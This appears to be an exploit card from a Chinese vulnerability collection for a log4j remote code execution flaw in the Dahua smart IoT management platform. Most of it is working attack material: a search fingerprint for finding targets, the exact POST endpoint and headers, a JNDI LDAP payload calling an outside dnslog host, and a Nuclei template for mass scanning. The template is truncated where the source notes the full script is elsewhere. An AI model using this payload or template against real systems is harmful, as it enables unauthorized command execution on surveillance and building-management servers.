# 大华智能物联综合管理平台log4j远程代码执行漏洞

- **系统**：大华　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="*客户端会小于800*"`
- **请求**：`POST /evo-apigw/evo-brm/1.2.0/user/is-exist HTTP/2`
- **关键头**：`Timeoffset: -28800000`　`Content-Type: application/json;charset=utf-8`　`cmd: whoami`　`User-Client: 1`　`Content-Length: 49`

**请求体 / payload**
```
{"loginName":"${jndi:ldap://mitptv.dnslog.cn}"}
Nuclei批量检测
id: dahuazhinengwuye-evo-apigw-rce
info:
name: dahuazhinengwuye-evo-apigw-rce
author: HackTwo
severity: high
description:
漏洞测试-RCE
reference:
- [https://wx.zsxq.com/dweb2/index/group/88885811181452](https://wx.zsxq.com/dweb2/index/group/88885811181452)
tags: auto
http:
- raw:
-
POST /evo-apigw/evo-brm/1.2.0/user/is-exist HTTP/1.1
Host: {{Hostname}}
cmd: whoami
Content-Type: application/json;charset=utf-8
{"loginName":"${jndi:ldap://{{interactsh-url}}}"}
matchers:
- type: word
part: interactsh_protocol # Confirms the DNS Interaction
wor…（脚本共 611 字，完整版见原文）
```